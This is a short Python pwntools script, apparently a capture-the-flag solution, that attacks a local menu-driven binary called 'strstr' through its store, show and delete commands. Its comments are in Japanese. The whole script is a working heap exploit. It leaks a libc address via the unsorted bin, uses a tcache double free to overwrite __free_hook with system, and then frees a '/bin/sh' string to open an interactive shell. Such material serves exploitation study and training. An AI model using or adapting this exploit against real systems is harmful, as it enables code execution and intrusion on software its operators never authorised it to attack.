from pwn import *

elf = ELF('strstr')
context.binary = elf

s = remote('localhost', 10006)

def store(index, string):
  s.sendlineafter('command: ', '0')
  s.sendlineafter('index: ', str(index))
  s.sendlineafter('string: ', string)

def show(index):
  s.sendlineafter('command: ', '1')
  s.sendlineafter('index: ', str(index))
  return s.recvline()[:-1]

def delete(index):
  s.sendlineafter('command: ', '2')
  s.sendlineafter('index: ', str(index))

# libcのアドレスのリーク
for i in range(8):
  store(i, 'a'*0x80)
store(8, 'a')  # topとの統合を防ぐ
for i in range(8):
  delete(i)
unsort = int.from_bytes(show(7), 'little')
libcbase = unsort - (0x3ebc40+0x60)
print('libcbase:', hex(libcbase))

# __free_hookにsystemのアドレスを代入する
libc = ELF('libc-2.27.so')
libc.address = libcbase

store(0, 'a')
delete(0)
delete(0)  # double free
store(0, pack(libc.symbols.__free_hook))
store(0, 'a')
store(0, pack(libc.symbols.system))
store(0, '/bin/sh')
delete(0)

s.interactive()
